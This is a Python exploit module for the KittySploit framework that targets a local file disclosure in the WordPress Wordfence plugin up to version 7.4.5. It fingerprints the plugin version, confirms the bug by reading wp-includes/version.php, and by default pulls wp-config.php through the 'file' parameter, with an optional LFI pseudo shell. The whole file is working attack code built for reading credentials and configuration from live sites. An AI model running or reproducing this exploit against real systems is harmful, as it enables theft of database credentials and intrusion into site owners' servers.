#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.lfi import Lfi
from lib.protocols.http.wordpress import Wordpress


class Module(Auxiliary, Http_client, Lfi, Wordpress):
    __info__ = {
        "name": "WordPress Wordfence <= 7.4.5 Local File Disclosure",
        "description": (
            "Wordfence <= 7.4.5 exposes a local file disclosure primitive in "
            "`lib/wordfenceClass.php` via the `file` GET parameter. The vulnerable "
            "code prepends ABSPATH and strips traversal prefixes, allowing reads of "
            "files located inside the WordPress installation."
        ),
        "author": ["mehran feizi", "KittySploit Team"],
        "references": [
            "https://wordpress.org/plugins/wordfence/",
        ],
        "cve": "",
        "tags": ["wordpress", "wordfence", "lfd", "lfi", "file-read", "auxiliary"],
    }

    verify_first = OptBool(
        True,
        "Verify plugin version and disclosure behavior before running handler_lfi",
        required=False,
        advanced=True,
    )
    probe_file = OptString(
        "wp-includes/version.php",
        "File used by check() to verify disclosure behavior",
        required=False,
        advanced=True,
    )
    max_output = OptInteger(
        65536,
        "Max characters of response body returned by execute() (0 = no limit)",
        required=False,
        advanced=True,
    )

    def _wp_base(self) -> str:
        return self.wp_normalize_base_path(self.path)

    def _plugin_readme_path(self) -> str:
        return self.wp_plugin_path(self._wp_base(), "wordfence", "readme.txt")

    def _vuln_endpoint(self) -> str:
        return self.wp_plugin_path(self._wp_base(), "wordfence", "lib", "wordfenceClass.php")

    def _is_vulnerable_version(self, version: str) -> bool:
        try:
            return self.wp_version_to_tuple(version) <= (7, 4, 5)
        except Exception:
            return False

    def _truncate(self, body: str) -> str:
        try:
            limit = int(self.max_output)
        except (TypeError, ValueError):
            limit = 65536
        if limit == 0:
            return body
        if len(body) > limit:
            print_warning(f"Truncated execute() output to {limit} chars (max_output)")
            return body[:limit]
        return body

    def execute(self, file_path: str) -> str:
        """Required by Lfi mixin. Returns disclosed file content."""
        if file_path is None or not str(file_path).strip():
            return ""

        # Vulnerable code prepends ABSPATH and strips traversal prefixes; keep
        # only a relative path inside WordPress root.
        normalized = str(file_path).strip().lstrip("/")
        if not normalized:
            return ""

        endpoint = self._vuln_endpoint()
        response = self.http_request(
            method="GET",
            path=endpoint,
            params={"file": normalized},
            allow_redirects=False,
            timeout=20,
        )
        if not response:
            return ""
        return self._truncate(response.text or "")

    def check(self):
        try:
            readme = self.http_request(method="GET", path=self._plugin_readme_path(), timeout=10)
            if not readme or readme.status_code != 200:
                return {"vulnerable": False, "reason": "Wordfence readme not accessible", "confidence": "low"}

            version = self.wp_extract_version_from_readme(readme.text or "")
            if not version:
                return {"vulnerable": False, "reason": "Unable to determine Wordfence version", "confidence": "low"}

            if not self._is_vulnerable_version(version):
                return {
                    "vulnerable": False,
                    "reason": f"Wordfence version {version} appears patched (> 7.4.5)",
                    "confidence": "high",
                }

            body = self.execute(self.probe_file)
            if "$wp_version" in body and "<?php" in body:
                return {
                    "vulnerable": True,
                    "reason": f"Wordfence {version} with successful file disclosure",
                    "confidence": "high",
                }

            return {
                "vulnerable": False,
                "reason": (
                    f"Wordfence {version} detected but disclosure probe failed "
                    f"for {self.probe_file}"
                ),
                "confidence": "medium",
            }
        except Exception as exc:
            return {"vulnerable": False, "reason": f"Check failed: {exc}", "confidence": "low"}

    def run(self):
        if not self.file_read:
            self.file_read = "wp-config.php"

        print_status(f"Target: {self.target}:{self.port} - Wordfence <= 7.4.5 LFD")

        if self.verify_first:
            print_status("Running vulnerability check...")
            check_result = self.check()
            if not check_result.get("vulnerable"):
                print_error(check_result.get("reason", "Target does not appear vulnerable"))
                return False
            print_success(check_result.get("reason", "Target appears vulnerable"))

        if self.shell_lfi:
            print_status("Starting LFI pseudo shell...")
        else:
            print_info(f"Reading file: {self.file_read}")

        self.handler_lfi()
        return True
